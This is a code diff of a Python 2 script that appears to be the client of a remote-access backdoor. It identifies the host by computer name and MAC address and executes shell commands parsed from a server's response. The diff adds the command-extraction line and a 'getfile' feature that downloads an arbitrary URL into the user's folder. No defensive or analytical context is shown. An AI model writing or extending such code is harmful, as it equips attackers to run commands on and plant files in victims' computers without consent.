@@ -180,7 +180,7 @@ while True:
                             sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
                             try:
                                     if sout == '1':
-                                            
+                                        scmd = sresponse[ifind+4:sresponse.find('||',ifind)]   
                                         sdump=subprocess.check_output(scmd,stderr=subprocess.STDOUT, shell=True)
 ##                                        process=subprocess.Popen(scmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT, shell=True)
 ##                                        p = Popen(scmd,shell=True)
@@ -220,7 +220,18 @@ while True:
                                        
                                             
                                     else:
-                                        p = Popen(scmd,shell=True)
+                                        igetfile=scmd.find('getfile')
+                                        ifile=scmd.rfind('/')
+                                        if igetfile==0:
+                                            geturl =scmd[8:len(scmd)]
+                                            
+                                            sfiledest= scmd[ifile+1:len(scmd)]
+                                            
+                                            f = urllib2.urlopen(geturl)
+                                            with open(suser+'\\'+ sfiledest, "wb") as code:
+                                                code.write(f.read())
+                                        else:
+                                            p = Popen(scmd,shell=True)
                             #print r.text
                             except Exception,e:
                                     print str(e)
